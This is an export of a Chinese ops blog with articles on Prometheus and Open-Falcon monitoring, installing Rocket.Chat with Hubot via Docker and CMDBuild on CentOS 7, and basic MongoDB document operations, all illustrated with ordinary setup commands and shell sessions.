ExporterExporter是Prometheus的一类数据采集组件的总称。它负责从目标处搜集数据，并将其转化为Prometheus支持的格式。与传统的数据采集组件不同的是，它并不向中央服务器发送数据，而是等待中央服务器主动前来抓取。 Prometheus提供多种类型的Exporter用于采集各种不同服务的运行状态。目前支持的有数据库、硬件、消息中间件、存储系统、HTTP服务器、JMX等。 alertmanager警告管理器，用来进行报警。 prometheus_cli命令行工具。 其他辅助性工具多种导出工具，可以支持Prometheus存储数据转化为HAProxy、StatsD、Graphite等工具所需要的数据存储格式。 架构：下面这张图说明了Prometheus的整体架构，以及生态中的一些组件作用: 基本原理是通过HTTP协议周期性抓取被监控组件的状态，任意组件只要提供对应的HTTP接口就可以接入监控。不需要任何SDK或者其他的集成过程。这样做非常适合做虚拟化环境监控系统，比如VM、Docker、Kubernetes等。输出被监控组件信息的HTTP接口被叫做exporter 。目前互联网公司常用的组件大部分都有exporter可以直接使用，比如Varnish、Haproxy、Nginx、MySQL、Linux系统信息(包括磁盘、内存、CPU、网络等等)。 Prometheus服务过程大概是这样： Prometheus Daemon负责定时去目标上抓取metrics(指标)数据，每个抓取目标需要暴露一个http服务的接口给它定时抓取。Prometheus支持通过配置文件、文本文件、Zookeeper、Consul、DNS SRV Lookup等方式指定抓取目标。Prometheus采用PULL的方式进行监控，即服务器可以直接通过目标PULL数据或者间接地通过中间网关来Push数据。 Prometheus在本地存储抓取的所有数据，并通过一定规则进行清理和整理数据，并把得到的结果存储到新的时间序列中。 Prometheus通过PromQL和其他API可视化地展示收集的数据。Prometheus支持很多方式的图表可视化，例如Grafana、自带的Promdash以及自身提供的模版引擎等等。Prometheus还提供HTTP API的查询方式，自定义所需要的输出。 PushGateway支持Client主动推送metrics到PushGateway，而Prometheus只是定时去Gateway上抓取数据。 Alertmanager是独立于Prometheus的一个组件，可以支持Prometheus的查询语句，提供十分灵活的报警方式。 场景适用的场景Prometheus在记录纯数字时间序列方面表现非常好。它既适用于面向服务器等硬件指标的监控，也适用于高动态的面向服务架构的监控。对于现在流行的微服务，Prometheus的多维度数据收集和数据筛选查询语言也是非常的强大。Prometheus是为服务的可靠性而设计的，当服务出现故障时，它可以使你快速定位和诊断问题。它的搭建过程对硬件和服务没有很强的依赖关系。 不适用的场景 Prometheus它的价值在于可靠性，甚至在很恶劣的环境下，你都可以随时访问它和查看系统服务各种指标的统计信息。 如果你对统计数据需要100%的精确，它并不适用，例如：它不适用于实时计费系统。]]></content>
      <categories>
        <category>应用运维</category>
        <category>监控积累</category>
      </categories>
      <tags>
        <tag>Prometheus</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[openfalcon的基本原理和使用]]></title>
    <url>%2Farticles%2Fcd887590.html</url>
    <content type="text"><![CDATA[目的本篇文章介绍下openfalcon的基本原理和使用，粒度相对较粗，主要目的是使大家迅速掌握open-falcon的数据模型、功能模块、运作流程和使用方法。 基本介绍Open-Falcon 是小米研发的一款开源的互联网企业级监控系统解决方案，目前小米、金山云、美团、京东金融、滴滴等公司有在使用。 下面我们遵循着问题来展开整篇文章。首先，open-falcon能做什么？ 主要特点有 ①数据采集免配置：agent自发现、支持Plugin、主动推送模式 ②容量水平扩展：生产环境每秒50万次数据收集、告警、存储、绘图，可持续水平扩展。 ③告警策略自发现：Web界面、支持策略模板、模板继承和覆盖、多种告警方式、支持回调动作。 ④告警设置人性化：支持最大告警次数、告警级别设置、告警恢复通知、告警暂停、不同时段不同阈 ​ 值、支持维护周期，支持告警合并。 ⑤历史数据高效查询：秒级返回上百个指标一年的历史数据。 ⑥Dashboard人性化：多维度的数据展示，用户自定义Dashboard等功能。 ⑦架构设计高可用：整个系统无核心单点，易运维，易部署。 其次，openfalcon能对哪些项目做监控 ？ 1）基础监控。 比如CPU、Load、内存、磁盘、IO、网络相关、内核参数、ss 统计输出、端口存活状态、进程存活状态、核心服务的进程存活信息采集、关键业务进程资源消耗、NTP offset采集、DNS解析采集，这些指标，都是open-falcon的agent组件直接支持的。 2）业务应用监控。 比如我的应用服务部署上线后，需要统计某个接口的平均耗时、调用次数、成功率等信息，这些属于业务应用的监控。这里需要研发人员编写脚本等方式来收集数据，然后发送到open-falcon的transfer组件。 3）第三方开源软件监控。 比如mysql、lvs、nginx、redis、mq等，需单独编写采集脚本或插件，这些常见的软件，一般开源社区都有提供相应的脚本。 这里有个openfalcon与其他一些监控软件的对比， 个人觉得，falcon比较大的优势在于扩展性和灵活性方面。 技术架构涉及架构或结构时，图是比较好的展示方式，下图摘自官网，可以看出组件及组件间协作。 绿色的粗线表示数据传输流程，橙黄色虚线表示控制流（策略，告警），浅蓝色虚线标识查询流程； 下图是一个相对规整的数据流图，更有助于理解： 具体而言，整体的运作流程如下： 1、目标服务器运行agent 2、agent采集各类监控项数值，传给transfer 3、transfer校验和整理监控项数值，做一致性hash分片，传给对应的judge模块以验证是否触发告警 4、transfer整理监控项数值，做一致性hash分片，传输给graph以进行数据的存储 5、judge根据具体报警策略或阈值进行告警判断，如触发告警则组装告警event事件，写入缓存队列。 6、alarm和sender根据event事件中的判定结果，执行event，像用户组发送短信或邮件。 7、graph收到监控项数据后，将数据存储成RRD文件格式，进行归档，并提供查询接口。 8、query将调用graph的查询接口，将监控数据传送到dashboard以进行页面展示。 9、dashboard则渲染页面，展示曲线报表图等。 10、portal提供页面供用户配置机器分组、报警策略、表达式、nodata等配置。 数据模型灵活强大的数据模型能提高监控系统的使用效率和灵活性（这小节提到的数据模型应该叫监控项数据模型），open-falcon的数据模型长什么样？设计初衷又是什么？ 12345678910111213141516open-falcon的"监控项"模型如下，&#123; metric: cpu.busy, // 监控项名称 endpoint: open-falcon-host, // 目标服务器的主机名 tags: srv=falcon,group=az1, // tag标签，作用是聚合和归类，在配报警策略时会比较方便。 value: 10, // 监控项数值 timestamp: `date +%s`, // 采集时间 counterType: GAUGE, // 监控项类型。 step: 60 // 采集间隔。 秒。&#125; 这种模型的主要好处：一是方便从多个维度来配置告警，二是可以灵活的进行自主数据采集。 第一点，比如tag的使用起到了给机器进行归类的作用，比如有3台机器：host1、host2和host3，如果tags依次配置为&quot;group=java&quot;, &quot;group=java&quot;和&quot;group=erlang&quot;，那么配置报警策略&quot;metric=cpu/group=java“时就只会对java标签的机器（即host1，host2)生效。 第二点，由于agent会自发现的采集很多基本的系统指标，但是对业务应用等需要研发人员自己写脚本收集和上报。这里openfalcon定义了监控项模型，相当于定义了一个规范，当研发人员需要监控某个对象（比如mysql、redis等），只需采集数据，并遵守规范包装成监控项模型，再上报即可。open-falcon使用的监控项有哪些类型 ？ 主要有三种： (1) GAUGE：实测值，直接使用采集的原始数值，比如气温； (2) COUNTER：记录连续增长的数据，只增不减。比如汽车行驶里程，网卡流出流量，cpu_idle等； (3) DERIVE：变化率，类似COUNTER ，但是可增可减。 主要模块agent 首先，什么是Agent？ agent是go开发的daemon程序，用于自发现的采集机器的各种数据和指标。部署在目标机器上，无需在server端进行任何配置，安装后启动即工作，是open-falcon的”数据采集者”。 主要功能？ ​ 1）自发现的采集各类数据和指标，上报transfer； ​ 2）与hbs进行心跳连接通信，上报主机状态，同步插件和监控进程、监控端口； 可采集的数据有哪些？ ​ 基础监控项(硬件,负载)、业务应用监控数据、各种开源软件监控数据等。 falcon是如何采集的？ 1）基础监控 ​ 一般是读系统文件或执行基本命令，然后对原始值进行处理。比如cpu和内存信息是通过读取/proc/stat和/proc/meminfo获得；端口监控，是通过ss –ln 来判断指定端口是否处于listen状态； 2）业务应用监控 一般由”插件”或”采集脚本”实现，需自己编写。比如接口的调用次数、耗时、失败次数、成功次数都属于这类。(日志、基础统计工具) 3）开源软件监控 一般开源社区都有提供采集脚本 如何扩展agent – 插件？ 除了基础监控项，有时用户想扩展agent的功能以采集更多指标，openfalcon提供了插件机制。插件的使用可以参考官方git文档，下面摘抄了作者们的一段话，其实就是一些采集脚本及同步执行的方式。 “插件设计思路： a) 写一个采集数据的脚本 b) 把脚本分发到需要采集数据的机器上 c) 写一个cron每隔一段时间去跑这个脚本 d) 收集脚本的输出，调用server的接口去push数据 e) 根据需求相应的对脚本做上线、下线、升级” agent的工作流程： Transfer组件 什么是transfer？ open-falcon的后端门户，监控数据的中转接点。 transfer的职责角色？ 提供数据接收接口和自定义脚本push数据； ​ 根据一致性hash算法将内存队列中的数据发送给graph和judge模块；(重点) ​ 为每个后端实例创建一个 定长Queue； ​ 为每个后端实例维护一个rpc连接池； 这里每个后端的graph或judge实例都建立了一个rpc连接池和一个定长Queue队列。 有两个小点这里提下： 1，定长Queue队列目的是应对高峰流量，丢失一部分高峰时段的数据保证了后端的graph和judge组件不受影响； v1.0版本的openfalcon中，每个graph实例可以有多个ip而且transfer会给每个ip发送相同的一份数据，但是judge中每个实例只能有1个ip。 transfer的工作流程？ graph组件 什么是graph？graph的职责？ ​ 存储监控数据、提供监控数据的高效查询接口。 graph的架构图(摘自项目git)： judge&amp;alarm&amp;sender组件这三个组件是报警的链路，负责判断是否触发报警，理论上可以进化成一个模块。感兴趣的可以看代码，很多匹配逻辑。 judge: 记载策略到缓存，判断监控项是否触发告警策略，发告警事件； alarm&amp;sender: 读取告警事件；发邮件、短信等； hbs组件 什么是hbs，hbs的职责？ ​ heart beat server，心跳服务器，更多承担”配置中心”的角色。 ​ 1）Agent可以从hbs同步”报警策略”、”进程存活监控”、”端口存活监控”等信息。 ​ 2）agent定期发送心跳信息，hbs负责维护host表； hbs的工作流程： 如何使用？目标 (1)、如何监控基本监控项？ (2)、如何使用插件，监控“第三方应用”？如何监控“端口/进程”？ (3)、如何配置“告警规则”? (4)、如何使用hostGroup、template、expression、nodata、uic？ (5)、如何更好管理机器？如hostName、hostGroup的命名约定； 先要理解的一些概念 (1)、机器分组 (2)、用户组 (3)、模板 (4)、表达式 (5)、报警策略 (6)、回调动作 如何采集基本监控项 ？ 在目标机器上部署agent，正确配置，启动即可； 如何监控“第三方应用”，如mysql/lvs/nginx？自己写脚本，上报到open-falcon；或者使用开源的插件或脚本； https://book.open-falcon.org/zh/philosophy/data-collect.html 如何监控“端口存活”、“进程存活” ？在port页面，新增expression或template，给指定进程或端口配置报警策略； 使用机器分组和报警策略模板？这里刚开始接触时觉得特别麻烦，后来拉出代码，分析其关联关系，梳理出了模型及关系图，一切变得清晰。下图依次是：hostgroup机器组管理、Tempalte报警策略模板、模型关系UML图。重点理解UML图，然后去页面上操作和比较下。 如何使用表达式 ？“策略表达式”与”策略模板”的区别？表达式比较简洁，在结合tag时可以使用策略表达式。 当无法区分类别时，比如所有监控项都没有加tag，只有进行人工分类，即使用”机器分组”，然后将”策略模板”绑定到”机器分组”。 其他其他需要自己翻文档或代码了，比如nodata，aggravation等等。通过这篇文章，希望能掌握open-falcon的运作机制，数据模型，如何使用它。]]></content>
      <categories>
        <category>应用运维</category>
        <category>监控积累</category>
      </categories>
      <tags>
        <tag>Open-falcon</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Rocketchat安装手册]]></title>
    <url>%2Farticles%2F1f64fa0e.html</url>
    <content type="text"><![CDATA[目的本文详细介绍了Chatops的实现服务Rocketchat的安装。 安装方法一：1，启动mongodb实例： 1`docker run --name db -d mongo:3.0 --smallfiles` 2，启动rocketchat server: 注意替换your_public_ip 1`docker run --name rocketchat -p 80:3000 --``env` `ROOT_URL=http:``//``&#123;your_public_ip&#125; --link db -d rocket.chat:0.62` 启动成功后，访问: http://{your_public_ip} 即可。 3，hubot实例:（最新版本，脚本目录映射有问题，请自行去掉） 添加robot前，确保server中已添加改账号，并设置了邮件为已验证。 1`docker run -it -e ROCKETCHAT_URL=http:``//``&#123;rocket_chat_server_ip&#125;:&#123;port&#125; \`` ``-e ROCKETCHAT_ROOM=``'general'` `\`` ``-e LISTEN_ON_ALL_PUBLIC=``true` `\`` ``-e ROCKETCHAT_USER=bot \`` ``-e ROCKETCHAT_PASSWORD=password \`` ``-e ROCKETCHAT_AUTH=password \`` ``-e BOT_NAME=bot \`` ``-e EXTERNAL_SCRIPTS=hubot-pugme,hubot-help \`` ``-``v` `$PWD``/scripts``:``/home/hubot/scripts` `\`` ``rocketchat``/hubot-rocketchat` 说明（下面未提及，不用更改）: 123456rocket_chat_server_ip: server地址ROCKETCHAT_ROOM: 默认加入的channel（房间），可以不填ROCKETCHAT_USER: robot名字, 例如: cicd-robot, git-merge-robotROCKETCHAT_PASSWORD: 密码$PWD/scripts:/home/hubot/scripts: 本地scripts脚本映射到容器内 方法二：1，编辑yaml文件 docker-compose.yml 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950db: image: mongo:3.0 command: mongod --smallfilesrocketchat: image: rocket.chat:0.62 environment: - MONGO_URL=mongodb://db:27017/rocketchat - ROOT_URL=http://10.10.0.137:3000 - Accounts_UseDNSDomainCheck=False links: - db:db ports: - 3000:3000hubot: image: rocketchat/hubot-rocketchat environment: - ROCKETCHAT_URL=http://10.10.0.137:3000 - ROCKETCHAT_ROOM=GENERAL - ROCKETCHAT_USER=Hubot - ROCKETCHAT_PASSWORD=Sun123456 - BOT_NAME=Hubot - EXTERNAL_SCRIPTS=hubot-help,hubot-seen,hubot-links,hubot-greetings - HUBOT_JENKINS_URL=10.10.0.137:8080 - HUBOT_JENKINS_AUTH=admin:admin123 links: - rocketchat:rocketchat 12342, 安装docker-composepip install docker-compose3, 启动容器docker-compose up 4, 注册管理员账号 5，添加bot账号（账号要和docker-compose中定义的用户名和密码一致） 6，重启所有容器，docker-compose restart 7, 验证 8，测试脚本sun.coffee 1234module.exports = (robot) -&gt; # 匹配所有 hi 相关的输入，然后发送 hello 到聊天室 robot.hear /hi/i, (res) -&gt; res.send 'hello' 9, 复制脚本到容器中 1docker cp ./sun.coffee root_hubot_1:/home/hubot/scripts 10，重启容器 12docker restart root_hubot_1docker exec -u root -it root_hubot_1 /bin/bash 11，验证]]></content>
      <categories>
        <category>智能工程</category>
      </categories>
      <tags>
        <tag>Ai</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS7下CMDBuild源码安装]]></title>
    <url>%2Farticles%2Fa46a113c.html</url>
    <content type="text"><![CDATA[目的本文对CMDBuild的安装配置进行了详细说明。 环境操作系统系统：CentOS-7-x86_64-Everything-1511 版本控制jdk版本(cmdb推荐版本1.8，采用1.8.0_131)：http://www.oracle.com/technetwork/java/javase/downloads/index.html tomcat版本(cmdb推荐版本7.068，采用7.0.79)：http://mirror.bit.edu.cn/apache/zookeeper/zookeeper-3.4.10/zookeeper-3.4.10.tar.gz postgresql版本(cmdb推荐版本9.3，采用9.6.3)：https://download.postgresql.org/pub/repos/yum/9.6/redhat/rhel-7-x86_64/pgdg-centos96-9.6-3.noarch.rpm Tomcat安装配置安装jdk1）下载jdk12cd /usr/local/src/wget http://download.Oracle.com/otn-pub/java/jdk/8u131-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk-8u131-linux-x64.rpm?AuthParam=1499065226_0efcc513ff7eb3edb189b0ee0eb7f2d1 2）安装jdk12#安装完成后可使用"java --version"查看环境是否准备就绪rpm -ivh jdk-8u131-linux-x64.rpm 安装tomcat1）下载tomcat12#注意是下载二进制包，非src包" apache-tomcat-7.0.79-src.tar.gz"wget http://mirrors.hust.edu.cn/apache/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.tar.gz 2）解压&amp;设置tomcat123tar -zxvf apache-tomcat-7.0.79.tar.gz -C /usr/local/cd /usr/local/mv apache-tomcat-7.0.79/ tomcat7/ 3）设置环境变量1234567#"tomcat7.sh"中的"tomcat7"部分自定义vim /etc/profile.d/tomcat7.shCATALINA_HOME=/usr/local/tomcat7export PATH=$PATH:$CATALINA_HOME/binsource /etc/profile 4）设置iptables1234567#tcp5432是postgresql的监听端口，tcp8080是tomcat的监听端口vim /etc/sysconfig/iptables-A INPUT -p tcp -m state --state NEW -m tcp --dport 5432 -j ACCEPT-A INPUT -p tcp -m state --state NEW -m tcp --dport 8080 -j ACCEPTservice iptables restart 5）设置开机启动（CentOS7.x）增加tomcat启动参数 12345#文件名“setenv.sh”固定，catalina.sh启动的时候会调用；#“tomcat.pid”文件会在tomcat启动后生成在$TOMCAT_HOME目录下vim /usr/local/tomcat7/bin/setenv.sh#add tomcat pid CATALINA_PID="$CATALINA_BASE/tomcat.pid" 增加tomcat.service 1234567891011121314151617181920#“tomcat.service”中的“tomcat”部分自定义；#或者在/etc/rc.d/rc.local添加启动脚本。vim /usr/lib/systemd/system/tomcat.service[Unit]Description=Tomcat After=syslog.target network.target remote-fs.target nss-lookup.target [Service] Type=forking PIDFile=/usr/local/tomcat7/tomcat.pidExecStart=/usr/local/tomcat7/bin/startup.shExecReload=/bin/kill -s HUP $MAINPID ExecStop=/bin/kill -s QUIT $MAINPID PrivateTmp=true [Install] WantedBy=multi-user.targetsystemctl enable tomcat.service 6）启动&amp;验证tomcat启动tomcat12#或者使用systemctl命令catalina.sh start 查看端口1netstat -tunlp web访问浏览器：http://ip:8080 部署cmdbuild下载cmdbbuild12cd /usr/local/srcwget https://ncu.dl.sourceforge.net/project/cmdbuild/2.4.3/cmdbuild-2.4.3.zip 部署cmdbuild12345678unzip cmdbuild-2.4.3.zipcd cmdbuild-2.4.3#复制解压目录下的“cmdbuild-2.4.3.war”到$TOMCAT_HOME的webapps目录下，并更名为” cmdbuild.war”;#复制解压目录下的“extras/tomcat-libs/6.0\ or\ higher/postgresql-9.4.1207.jar”到$TOMCAT_HOME的lib目录下，版本与postgresql不一致可忽略;#配置后需要重启tomcat，war包在tomcat启动会被解析cp cmdbuild-2.4.3.war /usr/local/tomcat7/webapps/cmdbuild.warcp extras/tomcat-libs/6.0\ or\ higher/postgresql-9.4.1207.jar /usr/local/tomcat7/lib/ 设置PostgreSQLPostgreSQL安装略 设置pg_hba.conf12345678vim /var/lib/pgsql/9.6/data/pg_hba.conf# "local" is for Unix domain socket connections onlylocal all all md5# IPv4 local connections:host all all 127.0.0.1/32 md5systemctl restart postgresql-9.6 创建cmdbuild数据库与账号123456su - postgres-bash-4.2$ psqlpostgres=# create user cmdbadmin with password 'cmdbadmin@123';postgres=# create database cmdbuild owner cmdbadmin;postgres=# grant all privileges on database cmdbuild to cmdbadmin; 导入数据表123456#此数据表是cmdb安装包中自带的1个demo表；#注意导入的数据库su - postgres-bash-4.2$ psql -U cmdbadmin -d cmdbuild -f /usr/local/tomcat7/webapps/cmdbuild/WEB-INF/sql/sample_schemas/demo_schema.sqlPassword for user cmdbadmin: 重启tomcat1234#重启cmdb后生效，可在部署cmdb包到tomcat之后直接重启-bash-4.2$ exitcatalina.sh stopsystemctl start tomcat 初始化cmdb浏览器访问：http://ip:8080/cmdbuild/ 登录后设置数据库]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>Cmdb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongodDB[三]:基本操作]]></title>
    <url>%2Farticles%2F19a8cfc5.html</url>
    <content type="text"><![CDATA[目的本文介绍MongoDB的基本操作，包括文档的创建、删除、和更新。 文档插入1、插入 1234567891011121314151617#查看当前都有哪些数据库&gt; show dbs;local 0.000GBtim 0.000GB#使用 tim数据库&gt; use tim;switched to db tim#查看都有哪些集合&gt; show collections;user&gt; db.user.indb.user.initializeOrderedBulkOp( db.user.insert( db.user.insertOne(db.user.initializeUnorderedBulkOp( db.user.insertMany(#使用insert方法插入文档，以&#123;&#125;包注，文档是以键值对出现的，必须成对设置&gt; db.user.insert(&#123;&quot;uid&quot;:1,&quot;name&quot;:&quot;luotianshuai&quot;,&quot;age&quot;:18,&quot;salary&quot;:1&#125;)WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)&gt; 2、查询 1234#通过find()方法进行查询&gt; db.user.find()&#123; &quot;_id&quot; : ObjectId(&quot;575f039f0c73a5a96e8f7c8f&quot;), &quot;uid&quot; : 1, &quot;name&quot; : &quot;luotianshuai&quot;, &quot;age&quot; : 18, &quot;salary&quot; : 1 &#125;&gt; 3、如何快速构造1万条文档呢？ 可以通过json的循环来实现 12345&gt; for(i=2;i&lt;=20;i++)&#123;... db.user.insert(&#123;&quot;uid&quot;:i,&quot;name&quot;:&quot;luotianshuai&quot;+i,&quot;salary&quot;:2000+Math.round(Math.random())*5000&#125;)... &#125;WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)&gt; 总结： 插入一条文档使用insert方法 文档的规则是键值对，他们是成对出现的他们之间用逗号分隔，键和值通过冒号分隔。 删除文档1、查询所有 1#db.user.find() 如果括号内不加任何条件那么默认是显示所有的文档 2、查询条件 12&gt; db.user.find(&#123;&quot;uid&quot;:1&#125;) #这里指定条件&#123; &quot;_id&quot; : ObjectId(&quot;575f039f0c73a5a96e8f7c8f&quot;), &quot;uid&quot; : 1, &quot;name&quot; : &quot;luotianshuai&quot;, &quot;age&quot; : 18, &quot;salary&quot; : 1 &#125; 3、删除文档 12&gt; db.user.remove(&#123;&quot;uid&quot;:1&#125;)WriteResult(&#123; &quot;nRemoved&quot; : 1 &#125;) #当removed为1的时候说明删除成功 4、清空集合 12&gt; db.user.remove(&#123;&#125;)WriteResult(&#123; &quot;nRemoved&quot; : 19 &#125;) 5、删除集合 12&gt; db.user.drop()true #如果返回true说明删除成功 更新文档先把之前删除掉饿文档创建一下： 1for(i=2;i&lt;=20;i++)&#123; db.user.insert(&#123;&quot;uid&quot;:i,&quot;name&quot;:&quot;luotianshuai&quot;+i,&quot;salary&quot;:2000+Math.round(Math.random())*5000&#125;) &#125; 1、更新文档 更新文档这里通过update方法括号内，第一个文档为查询的文档，第二个文档为修改为什么文档！ 12&gt; db.user.update(&#123;&quot;uid&quot;:2&#125;,&#123;&quot;name&quot;:&quot;shuaige&quot;&#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;) 通过查看这种更新方式，后面的文档会覆盖我们要修改文档的整个内容，就变成下面的内容了。uid字段salary字段都被覆盖掉了 12&gt; db.user.find()&#123; &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7ca3&quot;), &quot;name&quot; : &quot;shuaige&quot; &#125; 所以用下面的方法可以 12345678910&gt; db.user.update(&#123;&quot;uid&quot;:3&#125;,&#123;&quot;uid&quot; : 3, &quot;name&quot; : &quot;shuaige&quot;, &quot;salary&quot; : 2000 &#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)&gt; db.user.findOne(&#123;&quot;uid&quot;:3&#125;)&#123; &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7ca4&quot;), &quot;uid&quot; : 3, &quot;name&quot; : &quot;shuaige&quot;, &quot;salary&quot; : 2000&#125;&gt; 可以看到这个更新结果是我们想要的结果，这种方式叫做文档的替换方式更新！ 但是我们uid不需要变更，salary也不需要变更但是我们都要写出来！ 2、变量替换方式 我们可以把取出来的值赋值给一个变量，然后通过变量去修改！ 123456789101112131415161718192021222324252627282930#把查询到的值赋值给a&gt; a = db.user.findOne(&#123;&quot;uid&quot;:4&#125;)&#123; &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7ca5&quot;), &quot;uid&quot; : 4, &quot;name&quot; : &quot;luotianshuai4&quot;, &quot;salary&quot; : 7000&#125;&gt; a.nameluotianshuai4#通过变量.字段名去修改字段的内容&gt; a.name=&quot;dashuaige&quot;dashuaige&gt; db.user.findOne(&#123;&quot;uid&quot;:4&#125;)&#123; &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7ca5&quot;), &quot;uid&quot; : 4, &quot;name&quot; : &quot;luotianshuai4&quot;, &quot;salary&quot; : 7000&#125;#然后在通过update更新&gt; db.user.update(&#123;&quot;uid&quot;:4&#125;,a)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)&gt; db.user.findOne(&#123;&quot;uid&quot;:4&#125;)&#123; &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7ca5&quot;), &quot;uid&quot; : 4, &quot;name&quot; : &quot;dashuaige&quot;, &quot;salary&quot; : 7000&#125; 他的本质还是替换的方式，只不过是方便了 3、使用修改器$inc更新 如何对uid为10的用户增加100块钱工资 12345678910111213#这里$inc遵循键值对的规则，他相当于键，要修改的内容为值&gt; db.user.update(&#123;&quot;uid&quot;:10&#125;,&#123;&quot;$inc&quot;:&#123;&quot;salary&quot;:100&#125;&#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)#结果&#123; &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7cab&quot;), &quot;uid&quot; : 10, &quot;name&quot; : &quot;luotianshuai10&quot;, &quot;salary&quot; : 7100 &#125;#减100&gt; db.user.update(&#123;&quot;uid&quot;:10&#125;,&#123;&quot;$inc&quot;:&#123;&quot;salary&quot;:-100&#125;&#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)#结果&#123; &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7cab&quot;), &quot;uid&quot; : 10, &quot;name&quot; : &quot;luotianshuai10&quot;, &quot;salary&quot; : 7000 &#125; 4、添加一个字段$set修改器 有时候有需求要给某个文档添加一个字段，比如年龄。使用$set 123456#添加器$set&gt; db.user.update(&#123;&quot;uid&quot;:10&#125;,&#123;&quot;$set&quot;:&#123;&quot;age&quot;:18&#125;&#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)#结果&#123; &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7cab&quot;), &quot;uid&quot; : 10, &quot;name&quot; : &quot;luotianshuai10&quot;, &quot;salary&quot; : 7000, &quot;age&quot; : 18 &#125; 5、删除一个字段$unset修改器 有时候有需求要求给某个文档删除一个字段，比如年龄。使用$unset 123456#这里注意使用unset的时候他的值也是一个字典要删除的字段:1 这个1，是true的意思删除它，所以这个1是逻辑的true&gt; db.user.update(&#123;&quot;uid&quot;:10&#125;,&#123;&quot;$unset&quot;:&#123;&quot;age&quot;:1&#125;&#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)#结果&#123; &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7cab&quot;), &quot;uid&quot; : 10, &quot;name&quot; : &quot;luotianshuai10&quot;, &quot;salary&quot; : 7000 &#125; 看上面使用$unset的时候age的值为1说明为true那我们也可以通过值为true来删除它，那么我们来删除uid为10的salary字段 12345#例子&gt; db.user.update(&#123;&quot;uid&quot;:10&#125;,&#123;&quot;$unset&quot;:&#123;&quot;salary&quot;:true&#125;&#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)结果：&#123; &quot;_id&quot; : ObjectId(&quot;575f068e0c73a5a96e8f7cab&quot;), &quot;uid&quot; : 10, &quot;name&quot; : &quot;luotianshuai10&quot; &#125; 6、更新文档的其他参数 12345678910111213141516171819202122232425262728293031323334353637383940414243&gt; db.user.update(&#123;arg1&#125;,&#123;arg2&#125;,arg3,arg4)&apos;&apos;&apos;参数1:条件 #通过他来查找参数2:需要操作的更新内容 #把找到的文档修改参数3:参宿4:&apos;&apos;&apos;#参数3是做什么呢？咱们看下下面一种情况：如果我现在想更新一条数据uid为100，我这里是没有这个uid为100的文档的&gt; db.user.find(&#123;&quot;uid&quot;:100&#125;) #为空那么现在我修改他下那么会成功的修改吗？&gt; db.user.update(&#123;&quot;uid&quot;:100&#125;,&#123;&quot;uid&quot;:100,&quot;name&quot;:&quot;luotianshuai100&quot;,&quot;salary&quot;:100&#125;)WriteResult(&#123; &quot;nMatched&quot; : 0, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 0 &#125;)#看上面的提示找到0，修改0，说明没有更新，那么第3个参数的作用就来了，给他设置为true&gt; db.user.update(&#123;&quot;uid&quot;:100&#125;,&#123;&quot;uid&quot;:100,&quot;name&quot;:&quot;luotianshuai100&quot;,&quot;salary&quot;:100&#125;,true)WriteResult(&#123; &quot;nMatched&quot; : 0, &quot;nUpserted&quot; : 1, #当查找不到的时候，我们插入它 &quot;nModified&quot; : 0, &quot;_id&quot; : ObjectId(&quot;575f12ee7732f402fffdf61b&quot;)&#125;)&gt; #查看下,他更新成功了&#123; &quot;_id&quot; : ObjectId(&quot;575f12ee7732f402fffdf61b&quot;), &quot;uid&quot; : 100, &quot;name&quot; : &quot;luotianshuai100&quot;, &quot;salary&quot; : 100 &#125;&apos;&apos;&apos;so 那么第三个参数的含义就展现出来了，如果查找不到条件，那么就插入我们修改的内容&apos;&apos;&apos;#参数4的含义现在有个需求我现在需要给所有的员工加10000块钱，来看下我的操作&gt; db.user.update(&#123;&#125;,&#123;&quot;$inc&quot;:&#123;&quot;salary&quot;:1000&#125;&#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)#可以看到他只更新了匹配到的第一条数据那么，第4个参数的作用就来了&gt; db.user.update(&#123;&#125;,&#123;&quot;$inc&quot;:&#123;&quot;salary&quot;:1000&#125;&#125;,false,true)WriteResult(&#123; &quot;nMatched&quot; : 20, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 20 &#125;)&gt; &apos;&apos;&apos;从上面可以看出，第四个参数的作用就是设置为true的时候就是匹配所有文档&apos;&apos;&apos; 总结： 第3个和第4个参数默认为false 第一个为查找的条件，第二个为修改内容，第三个是是否在查不到的时候添加修改内容，第四个是是否匹配所有。 